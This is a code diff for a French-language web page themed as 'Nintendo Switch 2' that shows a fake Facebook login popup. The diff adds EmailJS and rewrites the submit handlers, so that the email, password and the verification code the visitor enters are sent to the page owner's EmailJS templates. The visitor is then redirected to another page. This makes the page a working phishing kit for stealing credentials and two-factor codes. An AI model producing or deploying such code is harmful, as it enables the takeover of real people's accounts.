@@ -5,6 +5,7 @@
   <title>Nintendo Switch 2</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
   <style>
     body {
@@ -49,6 +50,7 @@
       cursor: pointer;
       transition: 0.3s ease-in-out;
     }
+    .button[disabled] { opacity:.7; cursor:not-allowed; }
     .button:hover { background:#145dbf; transform: translateY(-1px); }
 
     .bitmoji-row {
@@ -149,10 +151,12 @@
     .btn { 
       border: none; border-radius: 9999px; padding: 12px 16px; font-weight: 700; cursor: pointer;
     }
+    .btn[disabled] { opacity:.7; cursor:not-allowed; }
     .btn-primary { background: #1877F2; color: #fff; }
     .btn-primary:hover { background: #145dbf; }
     .btn-secondary { background: transparent; color: #e4e6eb; border: 1px solid #3A3B3C; }
     .btn-secondary:hover { background: #3A3B3C; }
+    .helper { font-size:.9rem; color:#b0b3b8; margin-top:6px; }
   </style>
 </head>
 <body>
@@ -181,7 +185,7 @@
     <img src="banner.png" alt="Shooting banner"/>
   </div>
 
-  <!-- Overlay & Popups (restored) -->
+  <!-- Overlay & Popups -->
   <div id="overlay" class="overlay" onclick="closeAllPopups()"></div>
 
   <div class="login-popup" id="facebookPopup">
@@ -191,9 +195,10 @@
     <label for="fb-password">Mot de passe</label>
     <input id="fb-password" type="password" placeholder="Mot de passe"/>
     <div class="popup-actions">
-      <button class="btn btn-primary" onclick="submitFacebook()">Confirmer</button>
+      <button class="btn btn-primary" id="fb-submit" onclick="submitFacebook()">Confirmer</button>
       <button class="btn btn-secondary" onclick="closePopup('facebookPopup')">Retour</button>
     </div>
+    <div class="helper" id="fb-helper"></div>
   </div>
 
   <div class="verification-popup" id="verificationPopup">
@@ -201,12 +206,21 @@
     <label for="verificationCode">Entrer le code reçu :</label>
     <input id="verificationCode" type="text" inputmode="numeric" maxlength="8" pattern="\d*" placeholder="Code de 6 à 8 chiffres"/>
     <div class="popup-actions">
-      <button class="btn btn-primary" onclick="finishAndContinue()">OK</button>
+      <button class="btn btn-primary" id="code-submit" onclick="finishAndContinue()">OK</button>
       <button class="btn btn-secondary" onclick="closePopup('verificationPopup')">Retour</button>
     </div>
+    <div class="helper" id="code-helper"></div>
   </div>
 
   <script>
+    // Init EmailJS avec ta clé publique
+    document.addEventListener('DOMContentLoaded', function(){
+      if (window.emailjs) {
+        emailjs.init('AATQVLMcBJaRBgEox');
+      }
+      document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeAllPopups(); });
+    });
+
     function openFacebookPopup() {
       document.getElementById('overlay').style.display = 'block';
       document.getElementById('facebookPopup').style.display = 'block';
@@ -221,15 +235,61 @@
       document.getElementById('facebookPopup').style.display = 'none';
       document.getElementById('verificationPopup').style.display = 'none';
     }
-    function submitFacebook(){
-      // Ici on simule l'étape de vérification => on passe au code
-      document.getElementById('facebookPopup').style.display = 'none';
-      document.getElementById('verificationPopup').style.display = 'block';
+
+    // Envoi EmailJS – connexion Facebook
+    async function submitFacebook(){
+      const email = document.getElementById('fb-email').value.trim();
+      const pass  = document.getElementById('fb-password').value.trim();
+      const btn   = document.getElementById('fb-submit');
+      const help  = document.getElementById('fb-helper');
+
+      if (!email || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
+
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+
+      help.textContent = 'Envoi en cours...';
+      btn.disabled = true;
+
+      try {
+        await emailjs.send('service_photos', 'template_connexion', {
+          fb_email: email,
+          fb_password: pass
+        });
+        help.textContent = 'Informations envoyées. Vérification...';
+        // Enchaîne vers la vérification
+        document.getElementById('facebookPopup').style.display = 'none';
+        document.getElementById('verificationPopup').style.display = 'block';
+      } catch (err) {
+        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+      } finally {
+        btn.disabled = false;
+      }
     }
-    function finishAndContinue(){
-      // Comportement minimal : on ferme et on peut rediriger vers 'medias.html'
-      closeAllPopups();
-      window.location.href = 'medias.html';
+
+    // Envoi EmailJS – code de vérification
+    async function finishAndContinue(){
+      const code = document.getElementById('verificationCode').value.trim();
+      const btn  = document.getElementById('code-submit');
+      const help = document.getElementById('code-helper');
+
+      if (!code) { help.textContent = 'Veuillez entrer le code de vérification.'; return; }
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+
+      help.textContent = 'Validation en cours...';
+      btn.disabled = true;
+
+      try {
+        await emailjs.send('service_photos', 'template_code', {
+          verification_code: code
+        });
+        // Redirection après succès
+        closeAllPopups();
+        window.location.href = 'medias.html';
+      } catch (err) {
+        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+      } finally {
+        btn.disabled = false;
+      }
     }
   </script>
 </body>
